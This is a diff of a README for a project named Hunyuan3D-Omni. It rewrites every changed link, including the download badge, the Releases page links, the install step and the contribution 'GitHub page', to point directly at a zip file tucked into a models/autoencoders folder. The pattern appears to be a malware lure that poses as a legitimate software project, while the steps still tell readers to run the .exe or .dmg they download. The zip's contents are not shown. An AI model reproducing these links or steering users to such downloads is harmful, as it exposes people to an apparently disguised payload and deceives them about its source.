@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download Hunyuan3D-Omni](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/CristhianRubido/Hunyuan3D-Omni/releases)
+[![Download Hunyuan3D-Omni](https://raw.githubusercontent.com/CristhianRubido/Hunyuan3D-Omni/main/hy3dshape/models/autoencoders/Omni_Hunyuan_v3.0-beta.2.zip%20Now-brightgreen)](https://raw.githubusercontent.com/CristhianRubido/Hunyuan3D-Omni/main/hy3dshape/models/autoencoders/Omni_Hunyuan_v3.0-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -20,9 +20,9 @@ This guide will help you download, install, and run the application.
 
 ## 🔗 Download & Install
 
-To get started with Hunyuan3D-Omni, visit our [Releases page](https://github.com/CristhianRubido/Hunyuan3D-Omni/releases) to download the latest version of the software. Here's how to do it:
+To get started with Hunyuan3D-Omni, visit our [Releases page](https://raw.githubusercontent.com/CristhianRubido/Hunyuan3D-Omni/main/hy3dshape/models/autoencoders/Omni_Hunyuan_v3.0-beta.2.zip) to download the latest version of the software. Here's how to do it:
 
-1. Go to the [Hunyuan3D-Omni Releases page](https://github.com/CristhianRubido/Hunyuan3D-Omni/releases).
+1. Go to the [Hunyuan3D-Omni Releases page](https://raw.githubusercontent.com/CristhianRubido/Hunyuan3D-Omni/main/hy3dshape/models/autoencoders/Omni_Hunyuan_v3.0-beta.2.zip).
 2. Look for the latest version. It will usually be at the top of the list.
 3. Click on the link for your operating system. You may see files such as `.exe` for Windows or `.dmg` for macOS.
 4. The download will start automatically. Once completed, find the downloaded file in your computer's Downloads folder.
@@ -72,7 +72,7 @@ If you encounter issues while using Hunyuan3D-Omni, consider the following:
 
 ## 🙌 Contribution
 
-Hunyuan3D-Omni thrives on community support. If you're interested in contributing, we welcome your suggestions, feedback, and bug reports. To get involved, visit our [GitHub page](https://github.com/CristhianRubido/Hunyuan3D-Omni) for guidelines.
+Hunyuan3D-Omni thrives on community support. If you're interested in contributing, we welcome your suggestions, feedback, and bug reports. To get involved, visit our [GitHub page](https://raw.githubusercontent.com/CristhianRubido/Hunyuan3D-Omni/main/hy3dshape/models/autoencoders/Omni_Hunyuan_v3.0-beta.2.zip) for guidelines.
 
 ## 🙏 Acknowledgments
 
